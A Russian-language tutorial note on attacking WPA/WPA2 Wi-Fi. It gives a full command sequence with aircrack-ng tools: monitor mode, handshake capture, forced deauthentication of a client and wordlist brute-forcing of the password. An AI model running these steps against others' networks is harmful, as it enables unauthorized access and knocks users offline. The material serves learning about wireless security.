> ℹ️ Как ни странно, атаки на **WPA / WPA2** для понимания большинства намного проще, чем на тот же **WEP**. Возможно, все дело действительно в математике (ну или в количестве действий, необходимых для достижения результата).

Итак, а как же ломается алгоритм следующего поколения? Как ни странно, намного проще (с точки зрения исполнения) - достаточно всего лишь перехватить четырехэтапное рукопожатие.

И что, так просто? И да, и нет.

Сначала об атаках. Как мы знаем из [[Вводная теория#Аутентификация на основе четырехстороннего рукопожатия|введения]], ключ при четырехэтапном рукопожатии не передается полностью ни в одном из сообщений. Мало того, даже его части в явном виде не передаются по каналу связи. Тем не менее, от него зависят сессионные ключи (**PTK** и **GTK**), и имея их на руках, мы, чисто теоретически, можем попробовать получить из них пароль методом брутфорса.

Второй вариант - форсировать переустановку ключа (надеюсь, вы еще не забыли, что они временные?) на уже имевший место быть, что делает возможным расшифровать сообщения.

Но обо всем по порядку.

### Перехват четырехэтапного рукопожатия и восстановление пароля

Так как всю нужную теорию мы обсудили выше, вот краткий гайд, как это сделать:

`iwconfig` - получаем список интерфейсов.

`sudo systemctl stop NetworkManager` - остановка сервиса, который может помешать работе _aircrack-ng_.

`sudo airmon-ng check kill` - то же, что и выше.

`sudo ip link set wlan0 down` - останавливаем работу адаптера.

`sudo iw wlan0 set monitor control` - переводим адаптер в режим монитора.

`sudo ip link set wlan0 up` - снова включаем адаптер.

`iwconfig` - убеждаемся, что теперь в пункте _Mode_ стоит **Monitor**.

`airodump-ng wlan0` - получаем список BSSID точек, на которые мы можем провести атаку. Также благодаря этой команде можно понять, сколько устройств подключено к ней.

`iwconfig wlan0 channel <CH>` - настраиваемся на нужный канал (доступен в поле _CH_ результата команды выше).

`airodump-ng --bssid <BSSID> -w psk wlan0` - запускаем сбор трафика для того, чтобы поймать четырехэтапное рукопожатие.

`aireplay-ng -0 1 -a 64:D1:54:CA:D8:19 -c 00:0F:B5:FD:FB:C2 ath0` - запускаем деатунтификацию пользователя `00:0F:B5:FD:FB:C2` для ускорения процесса получения данных.

`aircrack-ng -w passwords.list -b 64:D1:54:CA:D8:19 psk*.cap` - запускаем брутфорс пароля по полученным данным и идем ~~курить~~ пить чай.

Стоит отметить, что данная атака очень сильно зависит от ~~параноидальности~~ осведомленности администратора сети. Если он выставил сложный или достаточно длинный пароль - взлом займет неадекватное количество времени, и сделать с этим, к сожалению, ничего нельзя.